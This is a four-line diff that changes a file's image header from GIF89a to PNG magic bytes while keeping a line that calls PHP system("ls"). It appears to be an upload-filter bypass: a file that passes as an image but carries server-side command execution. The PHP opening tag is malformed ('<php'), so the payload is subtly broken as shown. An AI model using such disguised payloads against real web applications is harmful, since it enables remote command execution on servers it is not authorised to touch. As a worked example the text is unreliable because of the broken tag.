@@ -1,4 +1,4 @@
-GIF89a
-
+‰PNG
+
 
 <php system("ls"); ?>
